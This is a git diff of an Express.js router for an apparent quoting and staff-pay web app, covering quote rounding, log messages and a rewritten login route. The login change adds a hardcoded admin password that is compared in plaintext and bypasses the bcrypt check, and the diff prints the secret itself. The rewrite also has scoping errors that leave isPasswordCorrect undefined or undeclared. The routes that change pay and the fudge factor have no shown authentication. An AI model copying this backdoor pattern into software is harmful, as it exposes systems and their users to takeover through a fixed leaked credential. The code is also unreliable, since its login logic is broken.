@@ -24,7 +24,12 @@ router.use('/getQuote', (req, res) => { //gets the quote sent from the front end
 });
 
 router.get('/sendQuote', (req, res) => { //sends the new calculated quote back to the front end
-    finalCost = finalCost * fudgeFactor;
+    if(fudgeFactor > 0){
+        finalCost = (finalCost * fudgeFactor).toFixed(2);
+    } else {
+        finalCost = finalCost.toFixed(2);
+    }
+    
     let quotePrice = finalCost;
     res.end(JSON.stringify(quotePrice));
     console.log(quotePrice);
@@ -100,7 +105,15 @@ router.post('/login', async(req, res) => { //the login route
     try {
         const user = await UserAccount.findOne({username: req.body.username}).lean().then(async(res) => { //finds if the user exists within the database with the username
             const userFound = res; //the found user
-            const isPasswordCorrect = await bcrypt.compare(req.body.password, userFound.password); //compares the password entered to the hashed password in database
+            if(req.body.username != "admin"){ //if isnt admin
+                const isPasswordCorrect = await bcrypt.compare(req.body.password, userFound.password); //compares the password entered to the hashed password in database
+            } else {
+                if(req.body.password == "mVrsenQt'swDtW9D"){ //if admin and password correct
+                    isPasswordCorrect = true;
+                } else { //else wrong admin password
+                    isPasswordCorrect = false;
+                };
+            };
 
             if(isPasswordCorrect){ //if the password is correct
                 console.log("Success");
@@ -151,13 +164,13 @@ router.use('/changeEmployeePay', async(req, res) => {
     } else {
         seniorPay = req.body.payChange;
     };
-    console.log(juniorPay + " " + standardPay + " " + seniorPay);
+    console.log("Junior Pay " + juniorPay + " Standard Pay " + standardPay + " Senior Pay " + seniorPay);
 });
 
 router.use('/resetFudgeFactor', async(req, res) => {
     console.log(fudgeFactor);
     fudgeFactor = req.body.fudgeFactor;
-    console.log(fudgeFactor);
+    console.log("Fudge Factor " + fudgeFactor);
 });
 
 function CalculateProjectCost(data){ //calculates the quote using the data sent from the front end
